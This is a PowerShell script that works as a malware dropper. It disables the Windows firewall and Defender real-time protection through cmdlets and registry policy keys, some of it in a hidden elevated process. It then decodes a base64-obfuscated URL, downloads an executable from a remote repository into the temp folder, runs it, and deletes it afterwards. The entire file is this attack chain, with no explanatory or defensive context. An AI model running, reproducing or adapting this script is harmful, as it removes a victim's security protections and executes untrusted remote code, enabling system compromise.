Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Disable Windows Defender Real-time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Ensure the key exists before adding the property
$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
if (-not (Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force | Out-Null
}
New-ItemProperty -Path $registryPath -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force

# Command to disable Real-time Monitoring using reg command
Start-Process -FilePath "cmd.exe" -ArgumentList "/c reg add `HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection` /v DisableRealtimeMonitoring /t REG_DWORD /d 1" -Verb RunAs -WindowStyle Hidden

# Set TLS 1.2 for secure download
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Encoded URL of the executable to download
$encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL3RhaGluampqL3R1c3RhNzc3L3Jhdy9tYWluL2JydWhoLmV4ZQ=="
$Url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))

# FileName and DestinationPath
$FileName = [System.IO.Path]::GetFileName($Url)
$DestinationPath = Join-Path -Path $env:TEMP -ChildPath $FileName

# Download the file
Invoke-WebRequest -Uri $Url -OutFile $DestinationPath

# Start the downloaded file
Start-Process -FilePath $DestinationPath
Start-Sleep -Seconds 8
Remove-Item -Path $DestinationPath -Force

exit
